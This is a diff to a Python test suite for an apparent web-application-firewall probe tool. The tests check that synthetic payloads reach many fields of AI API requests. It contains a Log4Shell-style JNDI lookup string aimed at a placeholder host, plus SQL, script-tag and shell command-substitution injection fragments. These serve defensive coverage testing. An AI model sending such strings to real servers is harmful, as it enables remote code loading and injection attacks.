@@ -397,15 +397,25 @@ class WafProbeTests(unittest.TestCase):
         literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
         cases = [case for case in probe.jndi_field_probes(self.routes)
                  if case.category == "extended-content-jndi-ai-history"]
-        self.assertLessEqual(len(cases), 20)
+        self.assertLessEqual(len(cases), 50)
         expected = {
             "/models/openai/v1/responses": {"input[].arguments", "input[].output[].text", "input[].input",
                 "input[].content", "tools[].parameters", "input[].tools[].tools[].description",
-                "input[].tools[].tools[].parameters", "input[].tools[].tools[].format.definition"},
+                "input[].tools[].tools[].parameters", "input[].tools[].tools[].format.definition",
+                "input[].summary[].text", "input[].content[].refusal", "text.format.description",
+                "tools[].output_schema.properties.sample.description", "input[].tools[].description",
+                "input[].tools[].format.definition", "input[].tools[].parameters.properties.sample.description",
+                "input[].tools[].output_schema.properties.sample.description",
+                "input[].tools[].tools[].output_schema.properties.sample.description", "input[].arguments.query",
+                "input[].action.command[]", "input[].action.commands[]", "input[].operation.diff",
+                "input[].output[].stdout", "input[].output[].stderr"},
             "/models/openai/v1/chat/completions": {"functions[].description", "functions[].parameters",
                 "messages[].function_call.arguments", "messages[].tool_calls[].custom.input",
                 "tools[].custom.description", "tools[].custom.format.grammar.definition",
-                "response_format.json_schema.schema", "messages[].content", "messages[].content[].text"},
+                "response_format.json_schema.schema", "messages[].content", "messages[].content[].text",
+                "messages[].refusal", "messages[].content[].refusal", "prediction.content",
+                "prediction.content[].text", "response_format.json_schema.description",
+                "messages[].reasoning_content"},
         }
         for path, fields in expected.items():
             self.assertTrue(fields <= {case.payload_field for case in cases if case.path == path})
@@ -439,13 +449,15 @@ class WafProbeTests(unittest.TestCase):
                  if case.category == "extended-content-jndi-dynamic-keys"]
         expected = {
             "/models/openai/v1/responses": {"keys:text.format.schema.properties", "keys:tools[].parameters.properties",
-                "keys:input[].tools[].tools[].parameters.properties"},
+                "keys:input[].tools[].tools[].parameters.properties", "keys:tools[].output_schema.properties",
+                "keys:input[].tools[].parameters.properties", "keys:input[].tools[].output_schema.properties",
+                "keys:input[].tools[].tools[].output_schema.properties", "keys:input[].arguments"},
             "/models/openai/v1/chat/completions": {"keys:response_format.json_schema.schema.properties",
                 "keys:tools[].function.parameters.properties", "keys:functions[].parameters.properties"},
             "/models/microsoft-decision/v1/systemone": {"keys:questions", "keys:state"},
             "/api/models/decision": {"keys:questions", "keys:state"},
         }
-        self.assertEqual(len(cases), 10)
+        self.assertEqual(len(cases), 21)
         for path, fields in expected.items():
             self.assertEqual({case.payload_field for case in cases if case.path == path}, fields)
         collisions = [case for case in corpus if case.category == "data-query-key-collision-jndi"]
@@ -487,19 +499,28 @@ class WafProbeTests(unittest.TestCase):
 
     def test_ai_coding_corpus_is_bounded_anonymous_and_keeps_its_controls(self):
         cases = probe.ai_coding_probes(self.routes)
-        self.assertLessEqual(len(cases), 96)
+        self.assertLessEqual(len(cases), 288)
         self.assertGreater(len(cases), 60)
         self.assertEqual([case.case_id for case in cases], [case.case_id for case in probe.ai_coding_probes(self.routes)])
         self.assertEqual(len(cases), len({case.case_id for case in cases}))
         self.assertTrue(all(case.auth_mode == "anonymous" for case in cases))
         self.assertTrue(all(case.target == "gateway" and case.method == "POST" for case in cases))
-        self.assertTrue(all(json.loads(case.body)["model"] == probe.INVALID_MODEL for case in cases))
+        self.assertTrue(all(json.loads(case.body)["model"] == probe.INVALID_MODEL
+                            for case in cases if case.payload_field != "model"))
         self.assertLess(max(len(case.body) for case in cases), 16384)
         for _, path in probe.CANARY_ROUTES:
             selected = [case for case in cases if case.path == path or case.path == path + "/neighbor"]
             controls = {case.category for case in selected if case.intent == "attack_control"}
-            self.assertEqual(controls, {"ai-coding-control-unknown-sqli", "ai-coding-control-unknown-xss",
-                "ai-coding-control-query-sqli", "ai-coding-control-neighbor-xss"})
+            expected_controls = {"ai-coding-control-unknown-sqli", "ai-coding-control-unknown-xss",
+                "ai-coding-control-query-sqli", "ai-coding-control-neighbor-xss",
+                "ai-coding-control-model-sqli", "ai-coding-control-header-sqli"}
+            if path.endswith("/responses"):
+                expected_controls |= {"ai-coding-control-arguments-sibling", "ai-coding-control-schema-sibling"}
+                expected_controls |= {"ai-coding-control-native-" + name + "-sibling"
+                                      for name in ("command", "commands", "diff", "stdout", "stderr")}
+            else:
+                expected_controls.add("ai-coding-control-reasoning-sibling")
+            self.assertEqual(controls, expected_controls)
             for case in selected:
                 if "query-collision" in case.category:
                     self.assertEqual(case.intent, "validation")
@@ -508,7 +529,7 @@ class WafProbeTests(unittest.TestCase):
                     self.assertIn((case.method, case.path), probe.CANARY_ROUTES)
             for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
                 family_cases = [case for case in selected if case.category.startswith("ai-coding-" + family + "-")]
-                self.assertEqual(len(family_cases), 5)
+                self.assertEqual(len(family_cases), 26 if path.endswith("/responses") else 11)
                 self.assertTrue(all(case.intent == "compatibility" for case in family_cases))
         with self.assertRaisesRegex(ValueError, "exactly"):
             probe.ai_coding_probes([route for route in self.routes if not route.path.endswith("/responses")])
@@ -534,6 +555,99 @@ class WafProbeTests(unittest.TestCase):
         php = next(case for case in cases if case.category == "ai-coding-php-variable-function-tool-parts")
         self.assertIn('$formatter("SYNTHETIC")', json.loads(php.body)["input"][2]["output"][0]["text"])
 
+    def test_reasoning_refusal_prediction_and_schema_descriptions_use_native_shapes(self):
+        for build, summaries in ((probe.ai_coding_probes, 5), (probe.jndi_field_probes, 1)):
+            cases = build(self.routes)
+            selected = [case for case in cases if case.intent == "compatibility"
+                        and case.payload_field == "input[].summary[].text"]
+            self.assertEqual(len(selected), summaries)
+            for case in selected:
+                body = json.loads(case.body)
+                reasoning = body["input"][0]
+                self.assertEqual(reasoning["type"], "reasoning")
+                self.assertEqual(reasoning["summary"][0]["type"], "summary_text")
+                self.assertTrue(reasoning["summary"][0]["text"])
+                self.assertEqual(body["model"], probe.INVALID_MODEL)
+                self.assertEqual(case.auth_mode, "anonymous")
+
+        cases = probe.ai_coding_probes(self.routes)
+        for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
+            selected = [case for case in cases if case.category.startswith("ai-coding-" + family + "-")]
+            responses = [case for case in selected if case.path.endswith("/responses")]
+            chat = [case for case in selected if case.path.endswith("/chat/completions")]
+            source = json.loads(next(case for case in responses if case.payload_field == "input").body)["input"]
+            summary = next(case for case in responses if case.payload_field == "input[].summary[].text")
+            self.assertEqual(json.loads(summary.body)["input"][0]["summary"], [{"type": "summary_text", "text": source}])
+            content = next(case for case in responses if case.category.endswith("-reasoning-content"))
+            self.assertEqual(json.loads(content.body)["input"][0]["content"], [{"type": "reasoning_text", "text": source}])
+            for collection, field in ((responses, "input[].content[].refusal"), (chat, "messages[].content[].refusal")):
+                refusal = json.loads(next(case for case in collection if case.payload_field == field).body)
+                message = refusal["input" if collection is responses else "messages"][0]
+                self.assertEqual(message["role"], "assistant")
+                self.assertEqual(message["content"], [{"type": "refusal", "refusal": source}])
+            refusal = json.loads(next(case for case in chat if case.payload_field == "messages[].refusal").body)
+            self.assertEqual(refusal["messages"][0]["refusal"], source)
+            self.assertIsNone(refusal["messages"][0]["content"])
+            for field, expected in (("prediction.content", source),
+                                    ("prediction.content[].text", [{"type": "text", "text": source}])):
+                prediction = json.loads(next(case for case in chat if case.payload_field == field).body)["prediction"]
+                self.assertEqual(prediction, {"type": "content", "content": expected})
+            description = json.loads(next(case for case in responses if case.payload_field == "text.format.description").body)
+            self.assertEqual(description["text"]["format"]["description"], source)
+            self.assertEqual(description["text"]["format"]["schema"], {"type": "object", "properties": {}})
+            description = json.loads(next(case for case in chat if case.payload_field == "response_format.json_schema.description").body)
+            self.assertEqual(description["response_format"]["json_schema"]["description"], source)
+
+    def test_direct_tool_definitions_object_arguments_and_output_schemas_are_isolated_data(self):
+        cases = probe.ai_coding_probes(self.routes)
+        for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
+            selected = [case for case in cases if case.path.endswith("/responses")
+                        and case.category.startswith("ai-coding-" + family + "-")]
+            source = json.loads(next(case for case in selected if case.payload_field == "input").body)["input"]
+            for label, tool_type in (("direct-function-description", "function"),
+                                     ("direct-custom-description", "custom"),
+                                     ("namespace-description", "namespace")):
+                case = next(case for case in selected if case.category.endswith("-" + label))
+                history = json.loads(case.body)["input"]
+                self.assertEqual(history[0]["call_id"], history[1]["call_id"])
+                self.assertEqual(history[1]["tools"][0]["type"], tool_type)
+                self.assertEqual(history[1]["tools"][0]["description"], source)
+            grammar = next(case for case in selected if case.payload_field == "input[].tools[].format.definition")
+            self.assertEqual(json.loads(grammar.body)["input"][1]["tools"][0]["format"],
+                             {"type": "grammar", "syntax": "regex", "definition": source})
+            arguments = next(case for case in selected if case.payload_field == "input[].arguments.query")
+            history = json.loads(arguments.body)["input"]
+            self.assertEqual(history[0]["arguments"], {"query": source})
+            self.assertEqual(history[0]["call_id"], history[1]["call_id"])
+            for label, nested in (("direct-output-schema", False), ("nested-output-schema", True)):
+                case = next(case for case in selected if case.category.endswith("-" + label))
+                tool = json.loads(case.body)["input"][1]["tools"][0]
+                if nested:
+                    tool = tool["tools"][0]
+                self.assertEqual(tool["output_schema"]["properties"]["sample"]["description"], source)
+                self.assertEqual(tool["parameters"], {"type": "object", "properties": {}})
+            output = next(case for case in selected if case.payload_field == "tools[].output_schema.properties.sample.description")
+            self.assertEqual(json.loads(output.body)["tools"][0]["output_schema"]["properties"]["sample"]["description"], source)
+
+        keys = [case for case in cases if case.payload_field.startswith("keys:")]
+        self.assertEqual(len(keys), 11)
+        for case in keys:
+            self.assertEqual(case.intent, "compatibility")
+            self.assertEqual(json.loads(case.body)["model"], probe.INVALID_MODEL)
+        for suffix, field in (("arguments-sibling", "argumentsExtra"), ("schema-sibling", "parametersExtra")):
+            control = next(case for case in cases if case.category == "ai-coding-control-" + suffix)
+            body = json.loads(control.body)
+            target = body["input"][0] if field == "argumentsExtra" else body["input"][0]["tools"][0]
+            self.assertEqual(target[field], probe.CONTROL_SQL)
+            self.assertEqual(control.intent, "attack_control")
+        for case in cases:
+            if case.category == "ai-coding-control-model-sqli":
+                self.assertEqual(json.loads(case.body)["model"], probe.CONTROL_SQL)
+            if case.category.startswith("ai-coding-query-key-collision-"):
+                self.assertEqual(case.intent, "validation")
+                self.assertTrue(case.query[0][0].endswith("." + probe.CONTROL_SQL))
+                self.assertEqual(case.query[0][1], "Synthetic value")
+
     def test_ai_coding_chat_history_includes_function_custom_and_legacy_tool_shapes(self):
         cases = [case for case in probe.ai_coding_probes(self.routes) if case.path.endswith("/chat/completions")]
         function = next(case for case in cases if case.category == "ai-coding-php-variable-function-function-arguments")
@@ -556,6 +670,110 @@ class WafProbeTests(unittest.TestCase):
         self.assertEqual(history[2]["role"], "function")
         self.assertEqual(history[1]["function_call"]["name"], history[2]["name"])
         self.assertIn("source", json.loads(history[1]["function_call"]["arguments"]))
+
+    def test_native_shell_patch_history_and_deepseek_reasoning_use_inert_text_items(self):
+        cases = probe.ai_coding_probes(self.routes)
+        for family in ("php-variable-function", "sql-source", "html-source", "shell-source", "powershell-source"):
+            selected = [case for case in cases if case.category.startswith("ai-coding-" + family + "-")]
+            source = json.loads(next(case for case in selected if case.payload_field == "input").body)["input"]
+            native = [case for case in selected if case.category.startswith("ai-coding-" + family + "-native-")]
+            self.assertEqual(len(native), 8)
+            for case in native:
+                body = json.loads(case.body)
+                self.assertEqual(body["model"], probe.INVALID_MODEL)
+                self.assertNotIn("tools", body)
+                self.assertEqual(case.auth_mode, "anonymous")
+                call, output = body["input"][:2]
+                self.assertEqual(call["call_id"], output.get("call_id", output.get("id")))
+                if case.category.endswith("-native-local-command"):
+                    self.assertEqual(call["type"], "local_shell_call")
+                    self.assertEqual(call["action"], {"type": "exec", "command": ["sh", "-c", source], "env": {}})
+                elif case.category.endswith("-native-shell-command"):
+                    self.assertEqual(call["type"], "shell_call")
+                    self.assertEqual(call["action"], {"commands": [source]})
+                elif case.category.endswith(("-native-local-output", "-native-patch-output")):
+                    self.assertIn(output["type"], {"local_shell_call_output", "apply_patch_call_output"})
+                    self.assertEqual(output["output"], source)
+                elif case.category.endswith(("-native-shell-stdout", "-native-shell-stderr")):
+                    self.assertEqual(output["type"], "shell_call_output")
+                    field = "stderr" if case.category.endswith("-stderr") else "stdout"
+                    self.assertEqual(output["output"][0][field], source)
+                    self.assertEqual(output["output"][0]["outcome"], {"type": "exit", "exit_code": 0})
+                else:
+                    self.assertEqual(call["type"], "apply_patch_call")
+                    operation = call["operation"]
+                    kind = "create_file" if case.category.endswith("-create") else "update_file"
+                    self.assertEqual(operation["type"], kind)
+                    self.assertEqual(operation["path"], "synthetic-probe.txt")
+                    diff = "\n".join("+" + line for line in source.splitlines()) + "\n"
+                    self.assertEqual(operation["diff"], diff if kind == "create_file" else "@@\n" + diff)
+            reasoning = next(case for case in selected if case.payload_field == "messages[].reasoning_content")
+            message = json.loads(reasoning.body)["messages"][0]
+            self.assertEqual(message["role"], "assistant")
+            self.assertEqual(message["content"], "Synthetic final answer")
+            self.assertEqual(message["reasoning_content"], source)
+
+        for name in ("command", "commands", "diff", "stdout", "stderr"):
+            control = next(case for case in cases if case.category == "ai-coding-control-native-" + name + "-sibling")
+            item = json.loads(control.body)["input"][0]
+            target = item["action"] if name in {"command", "commands"} else (
+                item["operation"] if name == "diff" else item["output"][0])
+            expected = [probe.CONTROL_SQL] if name in {"command", "commands"} else probe.CONTROL_SQL
+            self.assertEqual(target[name + "Extra"], expected)
+            self.assertEqual(control.intent, "attack_control")
+        sibling = next(case for case in cases if case.category == "ai-coding-control-reasoning-sibling")
+        message = json.loads(sibling.body)["messages"][0]
+        self.assertNotIn("reasoning_content", message)
+        self.assertEqual(message["reasoning_contentExtra"], probe.CONTROL_SQL)
+        self.assertEqual(sibling.intent, "attack_control")
+
+    def test_mixed_code_keys_and_query_collisions_cover_all_eleven_data_prefixes(self):
+        cases = probe.ai_coding_probes(self.routes)
+        keys = [case for case in cases if case.payload_field.startswith("keys:")]
+        expected = {
+            "/models/openai/v1/responses": {
+                "keys:text.format.schema.properties", "keys:tools[].parameters.properties",
+                "keys:input[].tools[].tools[].parameters.properties", "keys:tools[].output_schema.properties",
+                "keys:input[].tools[].parameters.properties", "keys:input[].tools[].output_schema.properties",
+                "keys:input[].tools[].tools[].output_schema.properties", "keys:input[].arguments"},
+            "/models/openai/v1/chat/completions": {
+                "keys:response_format.json_schema.schema.properties",
+                "keys:tools[].function.parameters.properties", "keys:functions[].parameters.properties"},
+        }
+        self.assertEqual(len(keys), 11)
+        for path, fields in expected.items():
+            self.assertEqual({case.payload_field for case in keys if case.path == path}, fields)
+
+        def multiline_keys(value, path=""):
+            found = []
+            if isinstance(value, dict):
+                for name, child in value.items():
+                    if "\n" in name:
+                        found.append((path, name))
+                    found.extend(multiline_keys(child, path + "." + name if path else name))
+            elif isinstance(value, list):
+                for child in value:
+                    found.extend(multiline_keys(child, path + "[]"))
+            return found
+
+        for case in keys:
+            body = json.loads(case.body)
+            found = multiline_keys(body)
+            self.assertEqual(len(found), 1)
+            field, source = found[0]
+            self.assertEqual(field, case.payload_field.removeprefix("keys:"))
+            for fragment in ("SELECT", "<script>", "$(printf synthetic)", "param($value)"):
+                self.assertIn(fragment, source)
+            self.assertEqual(body["model"], probe.INVALID_MODEL)
+            name = field.replace("[]", "")
+            collision = [item for item in cases if item.path == case.path
+                         and item.category.startswith("ai-coding-query-key-multiline-collision-")
+                         and item.payload_field == "query-keys:" + name]
+            self.assertEqual(len(collision), 1)
+            self.assertEqual(collision[0].query, ((name + "." + source, "Synthetic value"),))
+            self.assertEqual(collision[0].intent, "validation")
+            self.assertEqual(collision[0].auth_mode, "anonymous")
+            self.assertEqual(json.loads(collision[0].body)["model"], probe.INVALID_MODEL)
 
     def test_ai_coding_tool_search_namespace_and_chat_grammar_use_distinct_native_schemas(self):
         cases = probe.ai_coding_probes(self.routes)
@@ -593,7 +811,7 @@ class WafProbeTests(unittest.TestCase):
                     "--key-file", str(Path(directory) / "missing-secret"), "--output", str(output)])
             self.assertEqual(code, 0)
             report = json.loads(output.read_text(encoding="utf-8"))
-            self.assertEqual(report["selected_case_count"], 10)
+            self.assertEqual(report["selected_case_count"], 37)
             self.assertTrue(all(case["auth_mode"] == "anonymous" for case in report["results"]))
             self.assertTrue(all("body" not in case and "headers" not in case for case in report["results"]))
             self.assertNotIn('$formatter("SYNTHETIC")', json.dumps(report))
